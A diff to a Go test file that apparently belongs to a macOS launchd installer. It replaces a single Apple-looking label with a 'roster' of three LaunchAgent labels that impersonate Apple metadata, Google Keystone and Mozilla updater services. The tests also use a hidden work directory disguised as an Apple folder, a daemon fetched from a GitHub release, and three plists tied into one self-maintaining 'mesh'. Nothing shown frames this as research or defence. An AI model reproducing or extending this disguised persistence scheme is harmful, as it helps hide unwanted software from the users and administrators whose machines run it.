@@ -21,6 +21,11 @@ func TestParsePlistReturnsArgv(t *testing.T) {
 	binPath := "/x/y/com.apple.metadata.helper.7f3a"
 	plistPath := filepath.Join(dir, "test.plist")
 
+	roster := []string{
+		"com.apple.metadata.helper.7f3a2c11ab",
+		"com.google.keystone.daemon.8c1f4e9d22",
+		"org.mozilla.updater.agent.0a1b2c3d4e",
+	}
 	s := Spec{
 		Mode:     mode.User,
 		SelfPath: binPath,
@@ -28,15 +33,15 @@ func TestParsePlistReturnsArgv(t *testing.T) {
 		Github:   "o/r",
 		Asset:    "daemon-darwin-arm64",
 		Interval: 10 * time.Second,
-		Base:     "com.apple.metadata.helper.7f3a",
+		Roster:   roster,
 	}
 	if err := os.WriteFile(plistPath, []byte(Plist(s, RoleA)), 0o644); err != nil {
 		t.Fatal(err)
 	}
 
 	label, bin, argv := parsePlist(plistPath)
-	if label != "com.apple.metadata.helper.7f3a.a" {
-		t.Fatalf("label = %q", label)
+	if label != roster[0] {
+		t.Fatalf("label = %q, want %q", label, roster[0])
 	}
 	if bin != binPath {
 		t.Fatalf("bin = %q, want %q", bin, binPath)
@@ -69,17 +74,42 @@ func TestWorkdirFromArgvBothForms(t *testing.T) {
 	}
 }
 
-func TestLabelBaseStripsRoleSuffix(t *testing.T) {
-	cases := map[string]string{
-		"com.apple.metadata.helper.7f3a.a":      "com.apple.metadata.helper.7f3a",
-		"com.apple.metadata.helper.7f3a.b":      "com.apple.metadata.helper.7f3a",
-		"com.apple.metadata.helper.7f3a.ensure": "com.apple.metadata.helper.7f3a",
-		"com.something.unrelated":               "com.something.unrelated",
+// TestRosterFromArgv asserts the FEATURE 10 correlation key is recovered
+// from the --roster argv in both spellings, and that absence yields nil.
+func TestRosterFromArgv(t *testing.T) {
+	want := []string{"a.b.c", "d.e.f", "g.h.i"}
+	cases := []struct {
+		name string
+		argv []string
+		want []string
+	}{
+		{"--roster VAL", []string{"/bin/x", "--roster", "a.b.c,d.e.f,g.h.i"}, want},
+		{"--roster=VAL", []string{"/bin/x", "--roster=a.b.c,d.e.f,g.h.i"}, want},
+		{"absent", []string{"/bin/x", "--github", "o/r"}, nil},
+		{"dangling", []string{"/bin/x", "--roster"}, nil},
 	}
-	for in, want := range cases {
-		if got := labelBase(in); got != want {
-			t.Errorf("labelBase(%q) = %q, want %q", in, got, want)
-		}
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			got := rosterFromArgv(c.argv)
+			if !sameRoster(got, c.want) {
+				t.Fatalf("rosterFromArgv = %v, want %v", got, c.want)
+			}
+		})
+	}
+}
+
+// TestSameRoster covers the agreement predicate that ties three plists to
+// one install (different order or content ⇒ different mesh).
+func TestSameRoster(t *testing.T) {
+	a := []string{"x", "y", "z"}
+	if !sameRoster(a, []string{"x", "y", "z"}) {
+		t.Fatal("identical rosters must match")
+	}
+	if sameRoster(a, []string{"x", "z", "y"}) {
+		t.Fatal("reordered roster must NOT match")
+	}
+	if sameRoster(a, []string{"x", "y"}) {
+		t.Fatal("different-length roster must NOT match")
 	}
 }
 
@@ -103,10 +133,15 @@ func TestFindCurrentInstallHappyPath(t *testing.T) {
 	}
 
 	wd := filepath.Join(home, "Library", "Application Support", ".com.apple.metadata.7f3a")
+	roster := []string{
+		"com.apple.metadata.helper.7f3a2c11ab",
+		"com.google.keystone.daemon.8c1f4e9d22",
+		"org.mozilla.updater.agent.0a1b2c3d4e",
+	}
 	s := Spec{
 		Mode: mode.User, SelfPath: binPath, Workdir: wd,
 		Github: "o/r", Asset: "daemon-darwin-arm64",
-		Interval: 10 * time.Second, Base: "com.apple.metadata.helper.7f3a",
+		Interval: 10 * time.Second, Roster: roster,
 	}
 	for _, r := range AllRoles {
 		pp := filepath.Join(laDir, s.Label(r)+".plist")
@@ -133,8 +168,8 @@ func TestFindCurrentInstallHappyPath(t *testing.T) {
 	if cur.BinaryPath != binPath {
 		t.Errorf("BinaryPath = %q, want %q", cur.BinaryPath, binPath)
 	}
-	if cur.Base != "com.apple.metadata.helper.7f3a" {
-		t.Errorf("Base = %q", cur.Base)
+	if !sameRoster(cur.Roster, roster) {
+		t.Errorf("Roster = %v, want %v", cur.Roster, roster)
 	}
 	if cur.Workdir != wd {
 		t.Errorf("Workdir = %q, want %q", cur.Workdir, wd)
@@ -187,7 +222,12 @@ func TestFindCurrentInstallVerifyFailsSkipsPlist(t *testing.T) {
 	s := Spec{
 		Mode: mode.User, SelfPath: binPath, Workdir: wd,
 		Github: "o/r", Asset: "daemon-darwin-arm64",
-		Interval: 10 * time.Second, Base: "com.apple.metadata.helper.7f3a",
+		Interval: 10 * time.Second,
+		Roster: []string{
+			"com.apple.metadata.helper.7f3a2c11ab",
+			"com.google.keystone.daemon.8c1f4e9d22",
+			"org.mozilla.updater.agent.0a1b2c3d4e",
+		},
 	}
 	for _, r := range AllRoles {
 		pp := filepath.Join(laDir, s.Label(r)+".plist")
